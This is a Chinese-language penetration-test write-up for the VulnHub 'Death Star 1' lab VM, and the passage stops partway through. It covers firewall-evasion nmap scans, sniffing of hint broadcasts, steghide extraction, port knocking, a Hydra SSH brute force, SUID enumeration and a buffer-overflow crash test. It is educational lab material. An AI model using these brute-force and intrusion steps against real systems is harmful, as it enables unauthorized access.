<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script>
    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
<meta name="description" content="靶机地址: [https://www.vulnhub.com/entry/death-star-1,477/](https://www.vulnhub.com/entry/death-star-1,477/)

![image-20250515144334733](https://7r1umphk.github.io/image/20250515144342235.webp)

### 1. 主机发现与端口扫描

首先，使用 `arp-scan` 发现靶机 IP 地址。">
<meta property="og:title" content="VulnHub Death Star- 1 渗透测试报告">
<meta property="og:description" content="靶机地址: [https://www.vulnhub.com/entry/death-star-1,477/](https://www.vulnhub.com/entry/death-star-1,477/)

![image-20250515144334733](https://7r1umphk.github.io/image/20250515144342235.webp)

### 1. 主机发现与端口扫描

首先，使用 `arp-scan` 发现靶机 IP 地址。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7r1UMPHK.github.io/post/VulnHub%20Death%20Star-%201%20-shen-tou-ce-shi-bao-gao.html">
<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
<title>VulnHub Death Star- 1 渗透测试报告</title>
<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />


</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">VulnHub Death Star- 1 渗透测试报告</h1>
<div class="title-right">
    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/29" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><p>靶机地址: <a href="https://www.vulnhub.com/entry/death-star-1,477/" rel="nofollow">https://www.vulnhub.com/entry/death-star-1,477/</a></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c380ffa802478a0c180f36526ece276bbf58b54d7067bc1c7c744aae13e047b2/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531353134343334323233352e77656270"><img src="https://camo.githubusercontent.com/c380ffa802478a0c180f36526ece276bbf58b54d7067bc1c7c744aae13e047b2/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531353134343334323233352e77656270" alt="image-20250515144334733" data-canonical-src="https://7r1umphk.github.io/image/20250515144342235.webp" style="max-width: 100%;"></a></p>
<h3>1. 主机发现与端口扫描</h3>
<p>首先，使用 <code class="notranslate">arp-scan</code> 发现靶机 IP 地址。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ sudo arp-scan -l     
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.210 08:00:27:b2:99:5a       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ee:d6:af       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 1.977 seconds (129.49 hosts/sec). 4 responded</pre></div>
<p>靶机 IP 为 <code class="notranslate">192.168.205.210</code>。</p>
<p>尝试进行全端口快速扫描：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ nmap -p- --min-rate 10000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:32 EDT
Nmap scan report <span class="pl-k">for</span> 192.168.205.210
Host is up (0.00051s latency).
All 65535 scanned ports on 192.168.205.210 are <span class="pl-k">in</span> ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 13.51 seconds</pre></div>
<p>没有扫描到开放端口，所有端口状态为 <code class="notranslate">ignored</code> 或 <code class="notranslate">filtered</code>。<br>
确认主机是否连通：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ ping 192.168.205.210
PING 192.168.205.210 (192.168.205.210) 56(84) bytes of data.
64 bytes from 192.168.205.210: icmp_seq=1 ttl=64 time=0.475 ms
...
--- 192.168.205.210 ping statistics ---
11 packets transmitted, 11 received, 0% packet loss, <span class="pl-k">time</span> 10231ms
rtt min/avg/max/mdev = 0.285/0.325/0.475/0.050 ms</pre></div>
<p>主机是连通的。这表明可能有防火墙过滤了 TCP 端口扫描。</p>
<p>尝试使用 <code class="notranslate">-Pn</code> (跳过主机发现) 和其他扫描技术：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ sudo nmap -Pn -p- --min-rate 1000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:44 EDT
Nmap scan report <span class="pl-k">for</span> 192.168.205.210
Host is up (0.00038s latency).
All 65535 scanned ports on 192.168.205.210 are <span class="pl-k">in</span> ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 131.46 seconds</pre></div>
<p>尝试 ACK 扫描 (<code class="notranslate">-sA</code>) 来探测防火墙规则集：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ sudo nmap -Pn -sA -p- --min-rate 1000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:47 EDT
Nmap scan report <span class="pl-k">for</span> 192.168.205.210
Host is up (0.00038s latency).
All 65535 scanned ports on 192.168.205.210 are <span class="pl-k">in</span> ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 131.40 seconds</pre></div>
<p>结果依旧。尝试 FIN, Xmas, Null 隐蔽扫描：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sF -p- --min-rate 1000 192.168.205.210 <span class="pl-k">&amp;&amp;</span> \
sudo nmap -Pn -sX -p- --min-rate 1000 192.168.205.210 <span class="pl-k">&amp;&amp;</span> \
sudo nmap -Pn -sN -p- --min-rate 1000 192.168.205.210
<span class="pl-c"><span class="pl-c">#</span> ... (三次扫描结果类似，均为 open|filtered 或 filtered)</span></pre></div>
<p>TCP 端口扫描似乎都无法穿透防火墙。尝试 UDP 扫描：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/bj]
└─$ nmap -sU --top-ports 100 192.168.205.210                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:40 EDT
Nmap scan report <span class="pl-k">for</span> 192.168.205.210
Host is up (0.00035s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open<span class="pl-k">|</span>filtered dhcpc
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 103.11 seconds</pre></div>
<p>UDP 端口 68 (DHCP客户端) 通常不是可利用的入口。</p>
<p>尝试分片扫描 (<code class="notranslate">-f</code>) 和源端口伪装 (<code class="notranslate">-g 53</code>)：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sS -f -p- --min-rate 1000 192.168.205.210
<span class="pl-c"><span class="pl-c">#</span> ... (结果 filtered)</span>
                                                                      
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn -sS -g 53 -p- --min-rate 1000 192.168.205.210
<span class="pl-c"><span class="pl-c">#</span> ... (结果 filtered)</span></pre></div>
<p>所有 TCP 扫描尝试均失败，看来需要另辟蹊径。</p>
<h3>2. 流量捕获与信息获取</h3>
<p>既然主动扫描效果不佳，尝试捕获靶机发出的流量，看是否有线索。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i eth0 host 192.168.205.210 -nn                                    
tcpdump: verbose output suppressed, use -v[v]... <span class="pl-k">for</span> full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
03:12:01.447736 IP 192.168.205.210.44226 <span class="pl-k">&gt;</span> 255.255.255.255.160: UDP, length 472
03:12:01.447804 IP 192.168.205.210.44226 <span class="pl-k">&gt;</span> 255.255.255.255.160: UDP, length 472
03:12:01.448295 IP 192.168.205.210.53472 <span class="pl-k">&gt;</span> 255.255.255.255.357: UDP, length 97
03:12:01.448342 IP 192.168.205.210.53472 <span class="pl-k">&gt;</span> 255.255.255.255.357: UDP, length 97
03:12:20.192762 IP 192.168.205.210.68 <span class="pl-k">&gt;</span> 192.168.205.254.67: BOOTP/DHCP, Request from 08:00:27:b2:99:5a, length 300
03:12:20.192956 IP 192.168.205.254.67 <span class="pl-k">&gt;</span> 192.168.205.210.68: BOOTP/DHCP, Reply, length 300
^C
6 packets captured
6 packets received by filter
0 packets dropped by kernel</pre></div>
<p>发现靶机向广播地址的 UDP 端口 160 和 357 发送数据。使用 <code class="notranslate">nc</code> 监听这两个端口：</p>
<p>监听 UDP 160 端口：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
└─$ sudo nc -ulnp 160 -vv
listening on [any] 160 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 44380

Thanks to the successful Operation Skyhook, the Rebel Alliance
got some plans <span class="pl-k">for</span> the new weapon of the Galactic Empire. We
know that there is a small opening that we can explore through a
thermal exhaust that is directly connected to the Main Reactor of the
Death Star. The superlaser takes 1440 minutes to reload.
It is very important to observe <span class="pl-s"><span class="pl-pds">'</span>this window<span class="pl-pds">'</span></span> <span class="pl-k">in</span> order to recover the blueprint.
This is because, it is only possible to make an attempt every 60 seconds.
^C sent 0, rcvd 472

<span class="pl-c"><span class="pl-c">#</span> 翻译</span>
得益于“天钩行动”的成功，义军同盟
获得了一些银河帝国新武器的图纸。我们
知道有一个小开口，可以通过一个热排气口进行探索，这个排气口直接连接到死星的主反应堆。超级激光器需要1440分钟才能重新装填。
为了获取蓝图，观察“这个窗口”至关重要。
这是因为，每60秒只能尝试一次。</pre></div>
<p>监听 UDP 357 端口：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
└─$ sudo nc -ulnp 357 -vv
[sudo] password <span class="pl-k">for</span> kali: 
listening on [any] 357 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 45629


Code to access the Death Star Blueprint
within the <span class="pl-k">time</span> it takes to reload is:  DS-1@OBS     

^C sent 0, rcvd 97
                   
<span class="pl-c"><span class="pl-c">#</span> 翻译</span>
在重新加载所需的时间内访问死星蓝图的代码是：DS-1@OBS</pre></div>
<p>从 UDP 160 端口的信息中提取到数字 <code class="notranslate">1440</code> 和 <code class="notranslate">60</code>。从 UDP 357 端口的信息中获取到访问代码 <code class="notranslate">DS-1@OBS</code>。<br>
提示要观察一个 "窗口"，结合数字，猜测这可能是端口号。</p>
<p>尝试扫描这些数字对应的 UDP 端口：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
└─$ nmap -sU -p1440,24,60 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 03:39 EDT
Nmap scan report <span class="pl-k">for</span> 192.168.205.210
Host is up (0.00041s latency).

PORT     STATE  SERVICE
24/udp   closed priv-mail
60/udp   closed unknown
1440/udp open   eicon-slp
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.30 seconds</pre></div>
<p>UDP 1440 端口开放。</p>
<h3>3. 获取图片与信息提取</h3>
<p>向 UDP 1440 端口发送之前获取的代码 <code class="notranslate">DS-1@OBS</code>：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>DS-1@OBS<span class="pl-pds">"</span></span> <span class="pl-k">|</span> sudo nc -u 192.168.205.210 1440 <span class="pl-k">&gt;</span> 1440.txt</pre></div>
<p>查看接收到的内容，发现是 Base64 编码的数据，开头为 <code class="notranslate">/9j/4AAQSkZJRg</code>，这是 JPEG 文件的典型特征。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat 1440.txt <span class="pl-k">|</span> base64 -d <span class="pl-k">&gt;</span> 1440.jpg</pre></div>
<p>(注: 实际操作中应确保数据完整接收，若图片不完整可能导致后续步骤失败。可以使用 <code class="notranslate">nc -u -w1</code> 设置超时。)</p>
<p>打开图片 <code class="notranslate">1440.jpg</code>：<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4feea057d37cd09ab07b4bf11c53c09050f740ddeda5b0f6f714eeab59d63d83/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531353135343732323736342e77656270"><img src="https://camo.githubusercontent.com/4feea057d37cd09ab07b4bf11c53c09050f740ddeda5b0f6f714eeab59d63d83/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531353135343732323736342e77656270" alt="image-20250515154643417" data-canonical-src="https://7r1umphk.github.io/image/20250515154722764.webp" style="max-width: 100%;"></a><br>
图片上显示解锁代码：<strong>197719801983</strong>。</p>
<p>尝试对图片进行隐写分析。<code class="notranslate">strings</code> 和 <code class="notranslate">binwalk</code> 未发现明显线索。使用 <code class="notranslate">steghide</code>：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ steghide extract -sf 1440.jpg
Enter passphrase: DS-1@OBS
wrote extracted data to <span class="pl-s"><span class="pl-pds">"</span>openTheExhaust.txt<span class="pl-pds">"</span></span>.
                 
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat openTheExhaust.txt       
Each segment of the <span class="pl-s"><span class="pl-pds">"</span>unlock code<span class="pl-pds">"</span></span> can only contain 3 characters sent <span class="pl-k">in</span> sequence to unlock port 10110.
                   
<span class="pl-c"><span class="pl-c">#</span> 翻译</span>
“解锁码”每段只能包含3个字符，按顺序发送即可解锁10110端口。</pre></div>
<p>使用之前获取的 <code class="notranslate">DS-1@OBS</code> 作为密码，成功提取出 <code class="notranslate">openTheExhaust.txt</code> 文件。内容提示解锁代码每段3个字符，用于解锁 10110 端口。</p>
<h3>4. 端口敲门与 SSH 登录</h3>
<p>根据提示，将解锁代码 <code class="notranslate">197719801983</code> 分割成 <code class="notranslate">197</code>, <code class="notranslate">719</code>, <code class="notranslate">801</code>, <code class="notranslate">983</code>，并进行端口敲门：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ knock 192.168.205.210 197 719 801 983</pre></div>
<p>敲门后，扫描目标端口 10110：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p10110 -sT -sU 192.168.205.210 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:31 EDT
Nmap scan report <span class="pl-k">for</span> 192.168.205.210
Host is up (0.00035s latency).

PORT      STATE  SERVICE
10110/tcp open   nmea-0183
10110/udp closed nmea-0183
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.35 seconds</pre></div>
<p>TCP 10110 端口已开放。探测服务版本：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p10110 -sV 192.168.205.210    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:32 EDT
Nmap scan report <span class="pl-k">for</span> 192.168.205.210
Host is up (0.00033s latency).

PORT      STATE SERVICE VERSION
10110/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux<span class="pl-k">;</span> protocol 2.0)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux<span class="pl-k">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.47 seconds</pre></div>
<p>端口 10110 运行的是 OpenSSH 6.6.1p1。尝试 SSH 登录，此时我们没有任何凭据，先用 root 试试：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh root@192.168.205.210 -p 10110
The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>[192.168.205.210]:10110 ([192.168.205.210]:10110)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
<span class="pl-s">ECDSA key fingerprint is SHA256:oXn/1IjNjNv4INght0MV2FrWXVvTB4QNM9Bx1aRRLos.</span>
<span class="pl-s">This key is not known by any other names.</span>
<span class="pl-s">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
<span class="pl-s">Warning: Permanently added <span class="pl-pds">'</span></span>[192.168.205.210]:10110<span class="pl-s"><span class="pl-pds">'</span> (ECDSA) to the list of known hosts.</span>
<span class="pl-s"></span>
<span class="pl-s"># ... ASCII Art ...</span>
<span class="pl-s">                                                                          </span>
<span class="pl-s">Devoloped by Galen Walton Erso</span>
<span class="pl-s">System<span class="pl-pds">'</span></span>s user: erso
Pass Hint: My wife<span class="pl-s"><span class="pl-pds">'</span>s first name plus the year (BBY) she died.</span>
<span class="pl-s"></span>
<span class="pl-s">Glory to the Empire - Project DS-1: Orbital Battle Station</span>
<span class="pl-s"></span>
<span class="pl-s"></span>
<span class="pl-s">root@192.168.205.210<span class="pl-pds">'</span></span>s password: </pre></div>
<p>SSH 登录提示：</p>
<ul>
<li>用户名: <code class="notranslate">erso</code></li>
<li>密码提示: "我妻子的名字加上她去世的年份 (BBY)。" (My wife's first name plus the year (BBY) she died.)</li>
</ul>
<p>根据星球大战背景，Galen Erso 的妻子是 Lyra Erso。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/90556479dc73148d6657efb933632b043ff4556605c0a753b60e0bec2f798926/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531353136333534353034322e77656270"><img src="https://camo.githubusercontent.com/90556479dc73148d6657efb933632b043ff4556605c0a753b60e0bec2f798926/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531353136333534353034322e77656270" alt="image-20250515163544826" data-canonical-src="https://7r1umphk.github.io/image/20250515163545042.webp" style="max-width: 100%;"></a></p>
<p>她去世的年份是 13 BBY (Before Battle of Yavin)。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0ea9ec699c8c004619e0e55c8f3583556e4b7a611bc82f97b5b471907cdb164c/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531353136333632363037342e77656270"><img src="https://camo.githubusercontent.com/0ea9ec699c8c004619e0e55c8f3583556e4b7a611bc82f97b5b471907cdb164c/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303531353136333632363037342e77656270" alt="image-20250515163625883" data-canonical-src="https://7r1umphk.github.io/image/20250515163626074.webp" style="max-width: 100%;"></a></p>
<p>构造可能的密码列表：</p>
<pre class="notranslate"><code class="notranslate">Lyra13
lyra13
LyraErso13
lyraerso13
Lyraerso13
lyraErso13
Lyra13BBY
lyra13BBY
Lyra13bby
lyra13bby
Lyra-13
lyra-13
Lyra_13
lyra_13
Lyra
lyra
Erso
</code></pre>
<p>使用 Hydra 进行爆破：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ hydra -l erso -P pass ssh://192.168.205.210 -s 10110 -I -u -f -e nsr -t 64    
<span class="pl-cce">\H</span>ydra v9.5 (c) 2023 by van Hauser/THC <span class="pl-k">&amp;</span> David Maciejak - Please <span class="pl-k">do</span> not use <span class="pl-k">in</span> military or secret service organizations, or <span class="pl-k">for</span> illegal purposes (this is non-binding, these <span class="pl-k">***</span> ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-15 04:46:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 20 login tries (l:1/p:20), <span class="pl-k">~</span>1 try per task
[DATA] attacking ssh://192.168.205.210:10110/
[10110][ssh] host: 192.168.205.210   login: erso   password: lyra13
[STATUS] attack finished <span class="pl-k">for</span> 192.168.205.210 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-15 04:46:22</pre></div>
<p>成功爆破出密码为 <code class="notranslate">lyra13</code>。<br>
登录 SSH：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh erso@192.168.205.210 -p 10110
<span class="pl-c"><span class="pl-c">#</span> ... (Login banner) ...</span>
erso@deathStar1:<span class="pl-k">~</span>$ id
uid=1000(erso) gid=1000(erso) groups=1000(erso)</pre></div>
<p>成功登录用户 <code class="notranslate">erso</code>。</p>
<h3>5. 提权</h3>
<p>查看 <code class="notranslate">sudo</code> 权限和家目录下的文件：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ sudo -l
sudo: unable to resolve host deathStar1
[sudo] password <span class="pl-k">for</span> erso: 
Sorry, user erso may not run sudo on deathStar1.
erso@deathStar1:<span class="pl-k">~</span>$ ls -al
total 28
drwxr-xr-x 3 erso erso 4096 May  3  2020 <span class="pl-c1">.</span>
drwxr-xr-x 3 root root 4096 May  3  2020 ..
lrwxrwxrwx 1 root root    9 May  3  2020 .bash_history -<span class="pl-k">&gt;</span> /dev/null
-rw-r--r-- 1 erso erso  220 May  3  2020 .bash_logout
-rw-r--r-- 1 erso erso 3631 May  3  2020 .bashrc
drwx------ 2 erso erso 4096 May  3  2020 .cache
-rw-r--r-- 1 erso erso  690 May  3  2020 .profile
-rw------- 1 erso erso  369 May  3  2020 warning.txt
erso@deathStar1:<span class="pl-k">~</span>$ cat warning.txt 
Message from GALEN ERSO:
This is your chance. Destroy the plans of the Galactic Empire. I know that Lord Vader will not like this at all. But, this will be my chance <span class="pl-k">for</span> redemption. I hope you have enough knowledge to <span class="pl-c1">help</span> destroy this new weapon.
Explore the system and get <span class="pl-s"><span class="pl-pds">'</span>root access<span class="pl-pds">'</span></span> to <span class="pl-c1">read</span> the secret message located at <span class="pl-s"><span class="pl-pds">'</span>/root/message.txt<span class="pl-pds">'</span></span>. 
Hack or fail<span class="pl-k">!!</span></pre></div>
<p>提示 root flag 在 <code class="notranslate">/root/message.txt</code>。</p>
<p>查找 SUID 文件：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mtr
/usr/bin/pkexec
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/su
/bin/ping6
/bin/fusermount
/bin/dartVader  <span class="pl-k">&lt;</span>-- 可疑
/bin/umount
/bin/mount
/bin/ping</pre></div>
<p><code class="notranslate">/bin/dartVader</code> 是一个可疑的 SUID 文件，与靶机主题相关。</p>
<p>分析 <code class="notranslate">/bin/dartVader</code>：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ ls -l /bin/dartVader
-rwsr-xr-x 1 root root 7338 Nov  7  2019 /bin/dartVader
erso@deathStar1:<span class="pl-k">~</span>$ file /bin/dartVader
/bin/dartVader: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="pl-k">for</span> GNU/Linux 2.6.24, BuildID[sha1]=affd50502e973bd3d6d0637028395d87ba695ab9, not stripped
erso@deathStar1:<span class="pl-k">~</span>$ /bin/dartVader
dartVader: Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...
<span class="pl-c"><span class="pl-c">#</span> 翻译: 达斯·维达：你拥有未来。别做拉默，去探索并真正学习……</span></pre></div>
<p>这是一个 32 位 SUID 可执行文件。查看其字符串：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ strings /bin/dartVader
<span class="pl-c"><span class="pl-c">#</span> ... (部分输出) ...</span>
strcpy
<span class="pl-c"><span class="pl-c">#</span> ...</span>
game3.c
<span class="pl-c"><span class="pl-c">#</span> ...</span></pre></div>
<p>发现 <code class="notranslate">strcpy</code> 函数和源文件名 <code class="notranslate">game3.c</code>，这强烈暗示存在缓冲区溢出漏洞。</p>
<p>测试缓冲区溢出：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">erso@deathStar1:<span class="pl-k">~</span>$ /bin/dartVader aaaaaaaaa
erso@deathStar1:<span class="pl-k">~</span>$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
erso@deathStar1:<span class="pl-k">~</span>$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)</pre></div>
<p>输入大量 'a' 导致段错误，确认存在缓冲区溢出。</p>
<p>将 <code class="notranslate">/bin/dartVader</code> 文件传输到本地 Kali 进行分析：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ scp -P 10110 erso@192.168.205.210:/bin/dartVader <span class="pl-c1">.</span>
<span class="pl-c"><span class="pl-c">#</span> ... (传输成功) ...</span></pre></div>
<p>使用 IDA Pro 反编译 <code class="notranslate">dartVader</code>：</p>
<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-smi">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-smi">int</span> <span class="pl-s1">argc</span>, <span class="pl-k">const</span> <span class="pl-smi">char</span> <span class="pl-c1">*</span><span class="pl-c1">*</span><span class="pl-s1">argv</span>, <span class="pl-k">const</span> <span class="pl-smi">char</span> <span class="pl-c1">*</span><span class="pl-c1">*</span><span class="pl-s1">envp</span>)
{
